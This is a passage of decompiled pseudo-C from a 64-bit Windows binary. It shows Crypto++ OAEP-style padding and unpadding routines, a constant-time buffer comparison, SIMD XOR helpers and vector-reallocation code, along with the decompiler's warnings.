  v11 = (*(unsigned int (__fastcall **)(__int64))(*(_QWORD *)v10 + 64i64))(v10);
  v12 = (a6 >> 3) - v11;
  v13 = &v9[v11];
  v26 = -1i64;
  v27 = 0i64;
  v28 = 0i64;
  v24 = 0i64;
  v25 = 0i64;
  v23[0] = 0;
  (*(void (__fastcall **)(__int64, const char *, void *, char *))(*(_QWORD *)a7 + 8i64))(
    a7,
    "EncodingParameters",
    &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
    v23);
  if ( v23[0] )
  {
    v14 = v27;
    v15 = v28;
  }
  else
  {
    v14 = v25;
    v15 = v24;
  }
  (*(void (__fastcall **)(__int64, _BYTE *, void *, unsigned __int64))(*(_QWORD *)v10 + 96i64))(v10, v13, v15, v14);
  sub_13F15EF70((__int64)&v13[v11], 0, v12 - a4 - v11 - 1);
  v16 = (__m128i *)&v13[v12 - a4];
  v16[-1].m128i_i8[15] = 1;
  sub_13F15EB00(v16, v29, a4);
  (*(void (__fastcall **)(__int64, _BYTE *, __int64))(*(_QWORD *)a2 + 72i64))(a2, v9, v11);
  v22 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 56i64))(a1);
  (*(void (__fastcall **)(__int64, __int64, _BYTE *, __int64, _BYTE *, __int64, char))(*(_QWORD *)v22 + 8i64))(
    v22,
    v10,
    v13,
    v12,
    v9,
    v11,
    1);
  LOBYTE(v20) = 1;
  (*(void (__fastcall **)(__int64, __int64, _BYTE *, __int64, _BYTE *, __int64, int))(*(_QWORD *)v22 + 8i64))(
    v22,
    v10,
    v9,
    v11,
    v13,
    v12,
    v20);
  (**(void (__fastcall ***)(__int64, __int64))v22)(v22, 1i64);
  v17 = &v26;
  if ( v26 >= v27 )
    v17 = &v27;
  v18 = v28;
  if ( v28 )
  {
    memset(v28, 0, *v17);
    sub_13F12E550(v18);
  }
  return (**(__int64 (__fastcall ***)(__int64, __int64))v10)(v10, 1i64);
}
// 13F13351C: variable 'v20' is possibly undefined
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F1333A0: using guessed type char var_A0[8];

//----- (000000013F133590) ----------------------------------------------------
__int64 __fastcall sub_13F133590(__int64 a1, __int64 a2, _BYTE *a3, unsigned __int64 a4, __m128i *a5, __int64 a6)
{
  const __m128i *v6; // rdi
  bool v7; // si
  unsigned __int64 v8; // r15
  __int64 v9; // rbx
  __int64 v10; // r13
  __m128i *v11; // r12
  __m128i *v12; // rax
  __int64 v13; // rsi
  const __m128i *v14; // r14
  __int64 v15; // rax
  const __m128i *v16; // r13
  bool v17; // al
  char v18; // di
  unsigned __int64 v19; // r9
  void *v20; // r8
  __int8 *v21; // r14
  const __m128i *v22; // r13
  unsigned __int64 v23; // rdi
  __int64 v24; // r14
  unsigned __int64 v25; // rcx
  void *v26; // rdx
  unsigned __int64 v27; // rcx
  void *v28; // rdx
  int v30; // [rsp+30h] [rbp-A9h]
  char v31; // [rsp+40h] [rbp-99h]
  unsigned __int64 v32; // [rsp+48h] [rbp-91h]
  char v35[8]; // [rsp+60h] [rbp-79h] BYREF
  void *v36; // [rsp+68h] [rbp-71h]
  unsigned __int64 v37; // [rsp+70h] [rbp-69h]
  unsigned __int64 v38; // [rsp+80h] [rbp-59h]
  unsigned __int64 v39; // [rsp+88h] [rbp-51h]
  void *v40; // [rsp+90h] [rbp-49h]
  __int64 v41; // [rsp+98h] [rbp-41h]
  __int64 v42; // [rsp+A0h] [rbp-39h]
  __m128i *v43; // [rsp+A8h] [rbp-31h]
  __int64 v44; // [rsp+B0h] [rbp-29h]
  __int64 v45; // [rsp+B8h] [rbp-21h]
  __int64 v46; // [rsp+C8h] [rbp-11h]
  unsigned __int64 v47; // [rsp+D0h] [rbp-9h]
  __m128i *v48; // [rsp+D8h] [rbp-1h]

  v44 = -2i64;
  v6 = (const __m128i *)a3;
  v43 = a5;
  v41 = a6;
  v7 = 0;
  if ( (a4 & 7) != 0 )
  {
    v6 = (const __m128i *)(a3 + 1);
    v7 = *a3 != 0;
  }
  v8 = a4 >> 3;
  v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 48i64))(a1);
  v45 = v9;
  v10 = (*(unsigned int (__fastcall **)(__int64))(*(_QWORD *)v9 + 64i64))(v9);
  v42 = v10;
  v32 = v8 - v10;
  if ( v8 < 2 * v10 + 1 || (v31 = 0, v7) )
    v31 = 1;
  v46 = -1i64;
  v47 = v8;
  if ( v8 )
  {
    v12 = (__m128i *)sub_13F12E4E0(v8);
    v11 = v12;
    v48 = v12;
    if ( v12 )
    {
      if ( v6 )
        sub_13F10D330(v12, v8, v6, v8);
      else
        sub_13F15EF70((__int64)v12, 0, v8);
    }
  }
  else
  {
    v11 = 0i64;
    v48 = 0i64;
  }
  v13 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 56i64))(a1);
  (*(void (__fastcall **)(__int64, __int64, __m128i *, __int64, __int8 *, unsigned __int64, char))(*(_QWORD *)v13 + 8i64))(
    v13,
    v9,
    v11,
    v10,
    &v11->m128i_i8[v10],
    v32,
    1);
  LOBYTE(v30) = 1;
  (*(void (__fastcall **)(__int64, __int64, __int8 *, unsigned __int64, __m128i *, __int64, int))(*(_QWORD *)v13 + 8i64))(
    v13,
    v9,
    &v11->m128i_i8[v10],
    v32,
    v11,
    v10,
    v30);
  v38 = -1i64;
  v39 = 0i64;
  v40 = 0i64;
  v36 = 0i64;
  v37 = 0i64;
  v35[0] = 0;
  (*(void (__fastcall **)(__int64, const char *, void *, char *))(*(_QWORD *)v41 + 8i64))(
    v41,
    "EncodingParameters",
    &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
    v35);
  v14 = (__m128i *)((char *)v11 + v10 + v10);
  v15 = sub_13F15F8F0(v14, 1u, v8 - 2 * v10);
  v16 = (__m128i *)((char *)v11 + v8);
  if ( v15 )
    v16 = (const __m128i *)v15;
  v17 = v16 == (const __m128i *)&v11->m128i_i8[v8] || v31;
  if ( v14 == v16 )
    goto LABEL_23;
  while ( !v14->m128i_i8[0] )
  {
    v14 = (const __m128i *)((char *)v14 + 1);
    if ( v14 == v16 )
      goto LABEL_23;
  }
  if ( v14 == v16 )
  {
LABEL_23:
    if ( !v17 )
    {
      v18 = 0;
      goto LABEL_26;
    }
  }
  v18 = 1;
LABEL_26:
  if ( v35[0] )
  {
    v19 = v39;
    v20 = v40;
  }
  else
  {
    v19 = v37;
    v20 = v36;
  }
  v21 = &v11->m128i_i8[v42];
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, __int64, void *, unsigned __int64))(*(_QWORD *)v9 + 112i64))(
          v9,
          (__int64)v11->m128i_i64 + v42,
          v20,
          v19)
    || v18 )
  {
    v24 = a2;
    *(_BYTE *)a2 = 0;
    *(_QWORD *)(a2 + 8) = 0i64;
    v27 = v39;
    if ( v38 < v39 )
      v27 = v38;
    v28 = v40;
    if ( v40 )
    {
      memset(v40, 0, v27);
      sub_13F12E550(v28);
    }
    (**(void (__fastcall ***)(__int64, __int64))v13)(v13, 1i64);
    if ( v11 )
    {
      memset(v11, 0, v8);
      sub_13F12E550(v11);
    }
  }
  else
  {
    v22 = (const __m128i *)&v16->m128i_i8[1];
    v23 = v21 - (__int8 *)v22 + v32;
    sub_13F15EB00(v43, v22, v23);
    v24 = a2;
    *(_BYTE *)a2 = 1;
    *(_QWORD *)(a2 + 8) = v23;
    v25 = v39;
    if ( v38 < v39 )
      v25 = v38;
    v26 = v40;
    if ( v40 )
    {
      memset(v40, 0, v25);
      sub_13F12E550(v26);
    }
    (**(void (__fastcall ***)(__int64, __int64))v13)(v13, 1i64);
    if ( v11 )
    {
      memset(v11, 0, v8);
      sub_13F12E550(v11);
    }
  }
  (**(void (__fastcall ***)(__int64, __int64))v9)(v9, 1i64);
  return v24;
}
// 13F133675: conditional instruction was optimized away because r15.8!=0
// 13F1336E0: variable 'v30' is possibly undefined
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F133590: using guessed type char var_C0[8];

//----- (000000013F1338C0) ----------------------------------------------------
bool __fastcall sub_13F1338C0(__int64 a1, const __m128i *a2, unsigned __int64 a3)
{
  char v3; // r9
  unsigned __int64 v4; // rbx
  const __m128i *v5; // r11
  __int64 v6; // r10
  int v7; // ecx
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rsi
  unsigned __int64 v10; // r9
  const __m128i *v11; // rax
  __int64 v12; // rcx
  __m128i v13; // xmm3
  __m128i v14; // xmm2
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  __m128i v17; // xmm1
  __m128i v18; // xmm2
  __int64 *v19; // rcx
  unsigned __int64 v20; // rdi
  __int64 v21; // rax
  __int64 v22; // r9
  unsigned __int64 v24; // rdi
  unsigned __int64 v25; // rsi
  const __m128i *v26; // rax
  __int64 v27; // rdx
  __m128i v28; // xmm3
  __m128i v29; // xmm2
  __m128i v30; // xmm0
  __m128i v31; // xmm1
  __m128i v32; // xmm1
  __m128i v33; // xmm2
  __m128i v34; // xmm2
  __int32 *v35; // rdx
  unsigned __int64 v36; // r9
  int v37; // eax
  __int64 v38; // rdi
  __m128i v39; // xmm3
  __int64 v40; // rcx
  __m128i v41; // xmm2
  const __m128i *v42; // rax
  __m128i v43; // xmm0
  __m128i v44; // xmm1
  __m128i v45; // xmm1
  __m128i v46; // xmm2
  __m128i v47; // xmm2
  __m128i v48; // xmm2
  __m128i v49; // xmm2
  __int64 v50; // r10
  const __m128i *v51; // rcx
  unsigned __int64 v52; // r8
  char v53; // al

  v3 = 0;
  v4 = 0i64;
  v5 = a2;
  v6 = a1;
  if ( (a1 & 3) != 0 || ((unsigned __int8)a2 & 3) != 0 )
  {
LABEL_28:
    if ( a3 )
    {
      if ( a3 >= 0x20 )
      {
        v39 = 0i64;
        v40 = v6 - (_QWORD)v5;
        v41 = 0i64;
        v42 = v5;
        do
        {
          v43 = _mm_loadu_si128(v42);
          v4 += 32i64;
          v44 = _mm_loadu_si128((const __m128i *)((char *)v42 + v40));
          v42 += 2;
          v39 = _mm_or_si128(_mm_xor_si128(v44, v43), v39);
          v45 = _mm_or_si128(
                  _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v42 + v40 - 16)), _mm_loadu_si128(v42 - 1)),
                  v41);
          v41 = v45;
        }
        while ( v4 < (a3 & 0xFFFFFFFFFFFFFFE0ui64) );
        v46 = _mm_or_si128(v45, v39);
        v47 = _mm_or_si128(v46, _mm_srli_si128(v46, 8));
        v48 = _mm_or_si128(v47, _mm_srli_si128(v47, 4));
        v49 = _mm_or_si128(v48, _mm_srli_si128(v48, 2));
        v3 |= _mm_cvtsi128_si32(_mm_or_si128(v49, _mm_srli_si128(v49, 1)));
      }
      if ( v4 < a3 )
      {
        v50 = v6 - (_QWORD)v5;
        v51 = &v5[v4 / 0x10];
        v52 = a3 - v4;
        do
        {
          v53 = v51->m128i_i8[0] ^ v51->m128i_i8[v50];
          v51 = (const __m128i *)((char *)v51 + 1);
          v3 |= v53;
          --v52;
        }
        while ( v52 );
      }
    }
    return v3 == 0;
  }
  if ( !a3 )
    return v3 == 0;
  v7 = 0;
  if ( (v6 & 7) != 0 || ((unsigned __int8)a2 & 7) != 0 )
  {
LABEL_17:
    v24 = 0i64;
    v25 = a3 >> 2;
    if ( a3 >> 2 )
    {
      if ( v25 >= 8 )
      {
        v26 = v5 + 1;
        v27 = v6 - (_QWORD)v5;
        v28 = 0i64;
        v29 = 0i64;
        do
        {
          v30 = _mm_loadu_si128(v26 - 1);
          v24 += 8i64;
          v31 = _mm_loadu_si128((const __m128i *)((char *)v26 + v27 - 16));
          v26 += 2;
          v28 = _mm_or_si128(_mm_xor_si128(v31, v30), v28);
          v32 = _mm_or_si128(
                  _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v26 + v27 - 32)), _mm_loadu_si128(v26 - 2)),
                  v29);
          v29 = v32;
        }
        while ( v24 < (v25 & 0xFFFFFFFFFFFFFFF8ui64) );
        v33 = _mm_or_si128(v32, v28);
        v34 = _mm_or_si128(v33, _mm_srli_si128(v33, 8));
        v7 |= _mm_cvtsi128_si32(_mm_or_si128(v34, _mm_srli_si128(v34, 4)));
      }
      if ( v24 < v25 )
      {
        v35 = &v5->m128i_i32[v24];
        v36 = v25 - v24;
        v24 = a3 >> 2;
        do
        {
          v37 = *v35 ^ *(__int32 *)((char *)v35 + v6 - (_QWORD)v5);
          ++v35;
          v7 |= v37;
          --v36;
        }
        while ( v36 );
      }
    }
    v38 = 4 * v24;
    a3 -= v38;
    if ( !a3 )
      return v7 == 0;
    v6 += v38;
    v5 = (const __m128i *)((char *)v5 + v38);
    v3 = v7 | BYTE1(v7) | BYTE2(v7) | HIBYTE(v7);
    goto LABEL_28;
  }
  v8 = 0i64;
  v9 = a3 >> 3;
  v10 = 0i64;
  if ( a3 >> 3 )
  {
    if ( v9 >= 4 )
    {
      v11 = v5 + 1;
      v12 = v6 - (_QWORD)v5;
      v13 = 0i64;
      v14 = 0i64;
      do
      {
        v10 += 4i64;
        v15 = _mm_loadu_si128(v11);
        v13 = _mm_or_si128(
                _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v11 + v12 - 16)), _mm_loadu_si128(v11 - 1)),
                v13);
        v16 = _mm_loadu_si128((const __m128i *)((char *)v11 + v12));
        v11 += 2;
        v17 = _mm_or_si128(_mm_xor_si128(v16, v15), v14);
        v14 = v17;
      }
      while ( v10 < (v9 & 0xFFFFFFFFFFFFFFFCui64) );
      v18 = _mm_or_si128(v17, v13);
      v8 = _mm_or_si128(v18, _mm_srli_si128(v18, 8)).m128i_u64[0];
    }
    if ( v10 < v9 )
    {
      v19 = &v5->m128i_i64[v10];
      v20 = v9 - v10;
      v10 = a3 >> 3;
      do
      {
        v21 = *v19 ^ *(__int64 *)((char *)v19 + v6 - (_QWORD)v5);
        ++v19;
        v8 |= v21;
        --v20;
      }
      while ( v20 );
    }
  }
  v22 = 8 * v10;
  a3 -= v22;
  if ( a3 )
  {
    v6 += v22;
    v5 = (const __m128i *)((char *)v5 + v22);
    v7 = v8 | HIDWORD(v8);
    goto LABEL_17;
  }
  return v8 == 0;
}

//----- (000000013F133BE0) ----------------------------------------------------
void __fastcall sub_13F133BE0(unsigned __int64 a1, unsigned __int64 a2, const __m128i *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbx
  unsigned __int64 v5; // r10
  unsigned __int64 v6; // rsi
  unsigned __int64 v7; // rdi
  unsigned __int64 v8; // rdx
  const __m128i *v9; // rax
  unsigned __int64 v10; // rdx
  unsigned __int64 v11; // r11
  __m128i v12; // xmm0
  __m128i v13; // xmm1
  __m128i v14; // xmm2
  __m128i v15; // xmm1
  __m128i v16; // xmm0
  __m128i v17; // xmm2
  __m128i v18; // xmm0
  __m128i v19; // xmm1
  __m128i v20; // xmm1
  __m128i v21; // xmm0
  __m128i v22; // xmm2
  __int64 *v23; // rdx
  unsigned __int64 v24; // r11
  __int64 v25; // rsi
  unsigned __int64 v26; // rsi
  unsigned __int64 v27; // rdi
  unsigned __int64 v28; // rdx
  const __m128i *v29; // rax
  unsigned __int64 v30; // rdx
  unsigned __int64 v31; // r11
  __m128i v32; // xmm0
  __m128i v33; // xmm1
  __m128i v34; // xmm2
  __m128i v35; // xmm1
  __m128i v36; // xmm0
  __m128i v37; // xmm2
  __m128i v38; // xmm0
  __m128i v39; // xmm1
  __m128i v40; // xmm1
  __m128i v41; // xmm0
  __m128i v42; // xmm2
  __int32 *v43; // rdx
  unsigned __int64 v44; // r11
  __int64 v45; // rsi
  unsigned __int64 v46; // rdx
  unsigned __int64 v47; // rdx
  const __m128i *v48; // rax
  unsigned __int64 v49; // r11
  __m128i v50; // xmm0
  __m128i v51; // xmm1
  __m128i v52; // xmm2
  __m128i v53; // xmm1
  __m128i v54; // xmm0
  __m128i v55; // xmm2
  __m128i v56; // xmm0
  __m128i v57; // xmm1
  __m128i v58; // xmm1
  __m128i v59; // xmm0
  __m128i v60; // xmm2
  unsigned __int64 v61; // r10
  const __m128i *v62; // rdx
  unsigned __int64 v63; // rcx
  unsigned __int64 v64; // r9

  v4 = 0i64;
  v5 = a2;
  if ( (a1 & 3) != 0 || (a2 & 3) != 0 || ((unsigned __int8)a3 & 3) != 0 )
  {
LABEL_33:
    if ( a4 )
    {
      if ( a4 >= 0x40 )
      {
        v46 = a4 + a1 - 1;
        if ( (a1 > (unsigned __int64)&a3[-1].m128i_u64[1] + a4 + 7 || v46 < (unsigned __int64)a3)
          && (a1 > a4 + v5 - 1 || v46 < v5) )
        {
          v47 = v5 - (_QWORD)a3;
          v48 = a3;
          v49 = a1 - (_QWORD)a3;
          do
          {
            v50 = _mm_loadu_si128(v48);
            v4 += 64i64;
            v51 = _mm_loadu_si128((const __m128i *)((char *)v48 + v47));
            v52 = _mm_loadu_si128((const __m128i *)((char *)v48 + v47 + 16));
            v48 += 4;
            v53 = _mm_xor_si128(v51, v50);
            v54 = _mm_loadu_si128(v48 - 3);
            *(__m128i *)((char *)&v48[-4] + v49) = v53;
            v55 = _mm_xor_si128(v52, v54);
            v56 = _mm_loadu_si128(v48 - 2);
            v57 = _mm_loadu_si128((const __m128i *)((char *)v48 + v47 - 32));
            *(__m128i *)((char *)&v48[-3] + v49) = v55;
            v58 = _mm_xor_si128(v57, v56);
            v59 = _mm_loadu_si128(v48 - 1);
            v60 = _mm_loadu_si128((const __m128i *)((char *)v48 + v47 - 16));
            *(__m128i *)((char *)&v48[-2] + v49) = v58;
            *(const __m128i *)((char *)&v48[-1] + v49) = _mm_xor_si128(v60, v59);
          }
          while ( v4 < (a4 & 0xFFFFFFFFFFFFFFC0ui64) );
        }
      }
      if ( v4 < a4 )
      {
        v61 = v5 - (_QWORD)a3;
        v62 = &a3[v4 / 0x10];
        v63 = a1 - (_QWORD)a3;
        v64 = a4 - v4;
        do
        {
          v62->m128i_i8[v63] = v62->m128i_i8[0] ^ v62->m128i_i8[v61];
          v62 = (const __m128i *)((char *)v62 + 1);
          --v64;
        }
        while ( v64 );
      }
    }
    return;
  }
  if ( (a1 & 7) == 0 && (a2 & 7) == 0 && ((unsigned __int8)a3 & 7) == 0 )
  {
    v6 = 0i64;
    v7 = a4 >> 3;
    if ( a4 >> 3 )
    {
      if ( v7 >= 8 )
      {
        v8 = a1 - 8 + 8 * v7;
        if ( (a1 > (unsigned __int64)&a3[-1].m128i_u64[v7 + 1] || v8 < (unsigned __int64)a3)
          && (a1 > v5 - 8 + 8 * v7 || v8 < v5) )
        {
          v9 = a3 + 1;
          v10 = v5 - (_QWORD)a3;
          v11 = a1 - (_QWORD)a3;
          do
          {
            v12 = _mm_loadu_si128(v9 - 1);
            v6 += 8i64;
            v13 = _mm_loadu_si128((const __m128i *)((char *)v9 + v10 - 16));
            v14 = _mm_loadu_si128((const __m128i *)((char *)v9 + v10));
            v9 += 4;
            v15 = _mm_xor_si128(v13, v12);
            v16 = _mm_loadu_si128(v9 - 4);
            *(__m128i *)((char *)&v9[-5] + v11) = v15;
            v17 = _mm_xor_si128(v14, v16);
            v18 = _mm_loadu_si128(v9 - 3);
            v19 = _mm_loadu_si128((const __m128i *)((char *)v9 + v10 - 48));
            *(__m128i *)((char *)&v9[-4] + v11) = v17;
            v20 = _mm_xor_si128(v19, v18);
            v21 = _mm_loadu_si128(v9 - 2);
            v22 = _mm_loadu_si128((const __m128i *)((char *)v9 + v10 - 32));
            *(__m128i *)((char *)&v9[-3] + v11) = v20;
            *(const __m128i *)((char *)&v9[-2] + v11) = _mm_xor_si128(v22, v21);
          }
          while ( v6 < (v7 & 0xFFFFFFFFFFFFFFF8ui64) );
        }
      }
      if ( v6 < v7 )
      {
        v23 = &a3->m128i_i64[v6];
        v24 = v7 - v6;
        v6 = a4 >> 3;
        do
        {
          *(__int64 *)((char *)v23 + a1 - (_QWORD)a3) = *v23 ^ *(__int64 *)((char *)v23 + v5 - (_QWORD)a3);
          ++v23;
          --v24;
        }
        while ( v24 );
      }
    }
    v25 = 8 * v6;
    a4 -= v25;
    if ( !a4 )
      return;
    a1 += v25;
    v5 += v25;
    a3 = (const __m128i *)((char *)a3 + v25);
  }
  v26 = 0i64;
  v27 = a4 >> 2;
  if ( a4 >> 2 )
  {
    if ( v27 >= 0x10 )
    {
      v28 = a1 + 4 * (v27 - 1);
      if ( (a1 > (unsigned __int64)a3 + 4 * v27 - 4 || v28 < (unsigned __int64)a3)
        && (a1 > v5 + 4 * (v27 - 1) || v28 < v5) )
      {
        v29 = a3 + 1;
        v30 = v5 - (_QWORD)a3;
        v31 = a1 - (_QWORD)a3;
        do
        {
          v32 = _mm_loadu_si128(v29 - 1);
          v26 += 16i64;
          v33 = _mm_loadu_si128((const __m128i *)((char *)v29 + v30 - 16));
          v34 = _mm_loadu_si128((const __m128i *)((char *)v29 + v30));
          v29 += 4;
          v35 = _mm_xor_si128(v33, v32);
          v36 = _mm_loadu_si128(v29 - 4);
          *(__m128i *)((char *)&v29[-5] + v31) = v35;
          v37 = _mm_xor_si128(v34, v36);
          v38 = _mm_loadu_si128(v29 - 3);
          v39 = _mm_loadu_si128((const __m128i *)((char *)v29 + v30 - 48));
          *(__m128i *)((char *)&v29[-4] + v31) = v37;
          v40 = _mm_xor_si128(v39, v38);
          v41 = _mm_loadu_si128(v29 - 2);
          v42 = _mm_loadu_si128((const __m128i *)((char *)v29 + v30 - 32));
          *(__m128i *)((char *)&v29[-3] + v31) = v40;
          *(const __m128i *)((char *)&v29[-2] + v31) = _mm_xor_si128(v42, v41);
        }
        while ( v26 < (v27 & 0xFFFFFFFFFFFFFFF0ui64) );
      }
    }
    if ( v26 < v27 )
    {
      v43 = &a3->m128i_i32[v26];
      v44 = v27 - v26;
      v26 = a4 >> 2;
      do
      {
        *(__int32 *)((char *)v43 + a1 - (_QWORD)a3) = *v43 ^ *(__int32 *)((char *)v43 + v5 - (_QWORD)a3);
        ++v43;
        --v44;
      }
      while ( v44 );
    }
  }
  v45 = 4 * v26;
  a4 -= v45;
  if ( a4 )
  {
    a1 += v45;
    v5 += v45;
    a3 = (const __m128i *)((char *)a3 + v45);
    goto LABEL_33;
  }
}

//----- (000000013F133F90) ----------------------------------------------------
void __fastcall sub_13F133F90(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // r11
  unsigned __int64 v4; // rdi
  unsigned __int64 v5; // rbx
  unsigned __int64 v6; // rax
  unsigned __int64 v7; // r9
  __m128i v8; // xmm0
  __m128i v9; // xmm1
  __m128i v10; // xmm2
  __m128i v11; // xmm1
  _QWORD *v12; // r9
  unsigned __int64 v13; // r10
  __int64 v14; // rdi
  unsigned __int64 v15; // rdi
  unsigned __int64 v16; // rbx
  unsigned __int64 v17; // rax
  unsigned __int64 v18; // r9
  __m128i v19; // xmm0
  __m128i v20; // xmm1
  __m128i v21; // xmm2
  __m128i v22; // xmm1
  _DWORD *v23; // r9
  unsigned __int64 v24; // r10
  __int64 v25; // rdi
  const __m128i *v26; // rax
  unsigned __int64 v27; // r9
  __m128i v28; // xmm0
  __m128i v29; // xmm1
  unsigned __int64 v30; // rdx
  _BYTE *v31; // rax
  unsigned __int64 v32; // r8

  v3 = 0i64;
  if ( (a1 & 3) != 0 || (a2 & 3) != 0 )
  {
LABEL_27:
    if ( a3 )
    {
      if ( a3 >= 0x40 && (a1 > a3 + a2 - 1 || a3 + a1 - 1 < a2) )
      {
        v26 = (const __m128i *)a1;
        v27 = a2 - a1;
        do
        {
          v28 = _mm_loadu_si128(v26);
          v3 += 64i64;
          v29 = _mm_loadu_si128((const __m128i *)((char *)v26 + v27));
          v26 += 4;
          v26[-4] = _mm_xor_si128(v29, v28);
          v26[-3] = _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v26 + v27 - 48)), _mm_loadu_si128(v26 - 3));
          v26[-2] = _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v26 + v27 - 32)), _mm_loadu_si128(v26 - 2));
          v26[-1] = _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v26 + v27 - 16)), _mm_loadu_si128(v26 - 1));
        }
        while ( v3 < (a3 & 0xFFFFFFFFFFFFFFC0ui64) );
      }
      if ( v3 < a3 )
      {
        v30 = a2 - a1;
        v31 = (_BYTE *)(v3 + a1);
        v32 = a3 - v3;
        do
        {
          *v31 ^= v31[v30];
          ++v31;
          --v32;
        }
        while ( v32 );
      }
    }
    return;
  }
  if ( (a1 & 7) == 0 && (a2 & 7) == 0 )
  {
    v4 = 0i64;
    v5 = a3 >> 3;
    if ( a3 >> 3 )
    {
      if ( v5 >= 8 && (a1 > a2 - 8 + 8 * v5 || a1 - 8 + 8 * v5 < a2) )
      {
        v6 = a1 + 16;
        v7 = a2 - a1;
        do
        {
          v8 = _mm_loadu_si128((const __m128i *)(v6 - 16));
          v4 += 8i64;
          v9 = _mm_loadu_si128((const __m128i *)(v7 + v6 - 16));
          v10 = _mm_loadu_si128((const __m128i *)(v7 + v6));
          v6 += 64i64;
          *(__m128i *)(v6 - 80) = _mm_xor_si128(v9, v8);
          v11 = _mm_loadu_si128((const __m128i *)(v7 + v6 - 48));
          *(__m128i *)(v6 - 64) = _mm_xor_si128(v10, _mm_loadu_si128((const __m128i *)(v6 - 64)));
          *(__m128i *)(v6 - 48) = _mm_xor_si128(v11, _mm_loadu_si128((const __m128i *)(v6 - 48)));
          *(__m128i *)(v6 - 32) = _mm_xor_si128(
                                    _mm_loadu_si128((const __m128i *)(v7 + v6 - 32)),
                                    _mm_loadu_si128((const __m128i *)(v6 - 32)));
        }
        while ( v4 < (v5 & 0xFFFFFFFFFFFFFFF8ui64) );
      }
      if ( v4 < v5 )
      {
        v12 = (_QWORD *)(a1 + 8 * v4);
        v13 = v5 - v4;
        v4 = a3 >> 3;
        do
        {
          *v12 ^= *(_QWORD *)((char *)v12 + a2 - a1);
          ++v12;
          --v13;
        }
        while ( v13 );
      }
    }
    v14 = 8 * v4;
    a3 -= v14;
    if ( !a3 )
      return;
    a1 += v14;
    a2 += v14;
  }
  v15 = 0i64;
  v16 = a3 >> 2;
  if ( a3 >> 2 )
  {
    if ( v16 >= 0x10 && (a1 > a2 + 4 * (v16 - 1) || a1 + 4 * (v16 - 1) < a2) )
    {
      v17 = a1 + 16;
      v18 = a2 - a1;
      do
      {
        v19 = _mm_loadu_si128((const __m128i *)(v17 - 16));
        v15 += 16i64;
        v20 = _mm_loadu_si128((const __m128i *)(v17 + v18 - 16));
        v21 = _mm_loadu_si128((const __m128i *)(v17 + v18));
        v17 += 64i64;
        *(__m128i *)(v17 - 80) = _mm_xor_si128(v20, v19);
        v22 = _mm_loadu_si128((const __m128i *)(v17 + v18 - 48));
        *(__m128i *)(v17 - 64) = _mm_xor_si128(v21, _mm_loadu_si128((const __m128i *)(v17 - 64)));
        *(__m128i *)(v17 - 48) = _mm_xor_si128(v22, _mm_loadu_si128((const __m128i *)(v17 - 48)));
        *(__m128i *)(v17 - 32) = _mm_xor_si128(
                                   _mm_loadu_si128((const __m128i *)(v17 + v18 - 32)),
                                   _mm_loadu_si128((const __m128i *)(v17 - 32)));
      }
      while ( v15 < (v16 & 0xFFFFFFFFFFFFFFF0ui64) );
    }
    if ( v15 < v16 )
    {
      v23 = (_DWORD *)(a1 + 4 * v15);
      v24 = v16 - v15;
      v15 = a3 >> 2;
      do
      {
        *v23 ^= *(_DWORD *)((char *)v23 + a2 - a1);
        ++v23;
        --v24;
      }
      while ( v24 );
    }
  }
  v25 = 4 * v15;
  a3 -= v25;
  if ( a3 )
  {
    a1 += v25;
    a2 += v25;
    goto LABEL_27;
  }
}

//----- (000000013F134280) ----------------------------------------------------
__int64 sub_13F134280()
{
  return 0i64;
}

//----- (000000013F134290) ----------------------------------------------------
__int64 __fastcall sub_13F134290(__int64 *a1, __int64 a2, __int64 a3)
{
  __int64 v5; // r15
  __int64 v6; // rdx
  unsigned __int64 v7; // r14
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // rdi
  __int64 v11; // rsi
  __int64 v12; // r15
  __int64 v13; // r8
  __int64 v14; // rdx
  __int64 v16; // [rsp+20h] [rbp-58h]

  v5 = (a2 - *a1) / 112;
  v6 = (a1[1] - *a1) / 112;
  if ( v6 == 0x249249249249249i64 )
    sub_13F10D1F0();
  v7 = v6 + 1;
  v8 = (a1[2] - *a1) / 112;
  v9 = v8 >> 1;
  if ( v8 <= 0x249249249249249i64 - (v8 >> 1) )
  {
    v10 = v9 + v8;
    if ( v9 + v8 < v7 )
      v10 = v7;
  }
  else
  {
    v10 = v7;
  }
  v11 = sub_13F136060((__int64)a1, v10);
  v16 = 112 * v5;
  v12 = 112 * v5 + v11;
  sub_13F134610((__int64)a1, v12, a3);
  v13 = a1[1];
  v14 = *a1;
  if ( a2 == v13 )
  {
    sub_13F135FA0((__int64)a1, v14, v13, v11);
  }
  else
  {
    sub_13F135F20((__int64)a1, v14, a2, v11);
    sub_13F135F20((__int64)a1, a2, a1[1], v12 + 112);
  }
  sub_13F135AE0((__int64)a1, v11, v7, v10);
  return v16 + *a1;
}

//----- (000000013F134410) ----------------------------------------------------
__int64 __fastcall sub_13F134410(__int64 *a1, unsigned __int64 a2, __int64 a3)
{
  __int64 v6; // r14
  __int64 v7; // r10
  unsigned __int64 v8; // r15
  __int64 v9; // rcx
  __int64 result; // rax
  unsigned __int64 v11; // rdx
  unsigned __int64 v12; // rcx
  unsigned __int64 v13; // rdi
  __int64 v14; // rdi
  __int64 (__fastcall ***i)(_QWORD, _QWORD); // rbx
  __int64 v16; // [rsp+28h] [rbp-40h]

  v6 = a1[1];
  v7 = *a1;
  v8 = (v6 - *a1) / 48;
